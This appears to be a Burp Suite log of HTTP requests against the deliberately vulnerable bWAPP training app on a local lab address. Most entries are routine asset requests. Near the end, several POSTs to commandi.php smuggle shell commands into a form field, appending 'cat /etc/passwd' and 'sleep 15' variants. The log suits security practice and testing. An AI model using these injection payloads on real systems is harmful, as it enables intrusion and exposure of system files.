@@ -1,0 +1,2458 @@
+GET /css?family=Architects+Daughter HTTP/1.1
+Host: fonts.googleapis.com
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Accept: text/css,*/*;q=0.1
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: style
+Referer: http://192.168.118.128/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/netsparker.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/zap.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/mk.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/owasp.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/login.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+POST /bWAPP/login.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Origin: http://192.168.118.128
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Upgrade-Insecure-Requests: 1
+Cookie: PHPSESSID=g0effh2emshqspgppafj6vrrh1
+X-Burp-Comment:   |  
+
+login=bee&password=bug&security_level=2&form=submit
+========
+GET /bWAPP/4637126975386815517.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/4194838385963081280 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/js/2310503414884029899 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/xss_post.php
+Sec-Fetch-Dest: script
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/4456834183039354558 HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/xss_post.php
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%26sleep+15%26&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%3Bsleep+15%3B&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%26sleep+15%26%22&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%3Bsleep+15%3B%22&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%26sleep+15%26%27&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%3Bsleep+15%3B%27&form=submit
+========
